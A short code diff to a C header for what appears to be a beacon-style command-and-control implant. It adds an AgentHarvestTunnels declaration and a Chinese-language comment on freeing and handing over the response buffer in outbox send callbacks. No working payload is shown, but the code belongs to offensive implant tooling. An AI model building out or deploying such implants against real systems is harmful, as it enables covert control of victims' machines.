@@ -15,6 +15,7 @@ ByteBuf AgentBuildHeartbeatPlain(const BeaconContext* ctx);
 VOID AgentDispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks);
 VOID AgentFlushTransfers(BeaconContext* ctx);
 VOID AgentFlushTunnels(BeaconContext* ctx);
+VOID AgentHarvestTunnels(BeaconContext* ctx);
 VOID AgentFlushCascade(BeaconContext* ctx);
 VOID AgentFlushPostEx(BeaconContext* ctx);
 
@@ -27,6 +28,12 @@ VOID AgentFlushPostEx(BeaconContext* ctx);
  *   - 输出 response 为本次发送收到的任务密文（可为空）
  *   - 返回 1 成功，0 失败（失败时骨架把整批包回塞 outbox 并停止）
  * ctx_sender 是回调上下文（heartbeat / session / upstream 等）。
+ *
+ * response 清理契约（所有实现必须一致，新增回调照抄此约定）：
+ *   1. 回调开头必须 BbInit(response)；
+ *   2. 失败路径（返回 0）：回调自身负责 BbFree(response)，保证无泄漏；
+ *   3. 成功路径（返回 1）：response 所有权移交 AgentFlushOutbox，
+ *      由其在消费完毕后统一释放；调用方在返回 0 后绝不访问 response。
  */
 typedef INT (*OutboxSendFn)(BeaconContext* ctx, VOID* ctx_sender,
                             const ByteBuf* encrypted, ByteBuf* response);
